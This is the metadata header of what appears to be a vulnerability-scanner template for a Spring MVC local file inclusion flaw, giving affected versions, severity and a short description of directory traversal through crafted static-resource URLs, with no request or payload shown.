info:
  name: Spring MVC Framework - Local File Inclusion
  author: hetroublemakr
  severity: medium
  description: Spring MVC Framework versions 5.0 prior to 5.0.5 and versions 4.3 prior to 4.3.15 and older unsupported are vulnerable to local file inclusion because they allow applications to configure Spring MVC to serve static resources (e.g. CSS, JS, images). A malicious user can send a request using a specially crafted URL that can lead a directory traversal attack.
